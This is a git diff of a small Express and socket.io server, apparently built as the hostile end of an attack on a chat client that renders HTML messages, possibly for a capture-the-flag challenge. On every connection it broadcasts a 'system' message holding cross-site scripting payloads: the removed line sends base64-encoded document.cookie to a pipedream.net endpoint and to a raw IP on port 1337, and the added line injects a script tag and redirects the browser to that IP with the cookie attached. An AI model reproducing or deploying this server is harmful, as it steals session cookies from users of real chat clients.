@@ -1,28 +1,35 @@
 const app = require('express')();
 const http = require('http').Server(app);
+const cors = require('cors')
+const DOMPurify = require('isomorphic-dompurify');
+const hostname = process.env.HOSTNAME || '0.0.0.0';
+const port = process.env.PORT || 80;
+const rooms = ['textContent', 'DOMPurify'];
 const io = require('socket.io')(http,{
     cors: {
       origin: "*",
       methods: ["GET", "POST"]
     }
   });
-const cors = require('cors')
-const DOMPurify = require('isomorphic-dompurify');
-const hostname = process.env.HOSTNAME || '0.0.0.0';
-const port = process.env.PORT || 80;
-const rooms = ['textContent', 'DOMPurify'];
-app.use(cors())
+// app.use(cors())
 
+const corsOptions = {
+    origin: false,
+    optionsSuccessStatus: 200 
+}
 
-app.get('/', (req, res) => {
-    res.sendFile(__dirname + '/index.html');
+app.get('/', cors(corsOptions), (req, res) => {
+    console.log(req)
 });
 
 io.on('connection', (socket) => {
-    socket.join(room);
-    io.to(room).emit('msg', {
+    let {nickname, room} = socket.handshake.query;
+    console.log(nickname)
+    console.log(room)
+    socket.join(rooms[1]);
+    io.to(rooms[1]).emit('msg', {
         from: 'system',
-        text: `<img src="1" onerror="https://eoctl0knzoys9l9.m.pipedream.net/cookie=${btoa(document.cookie)}"><h1>hi</h1><img src="1" onerror="http://139.59.40.222:1337/cookie=${btoa(document.cookie)}">`,
+        text: '</li></ul><script>alert(1)</script><img src=x onerror="document.location=\'http://139.59.40.222/?\'+document.cookie">',
         isHtml:true
     });
 });
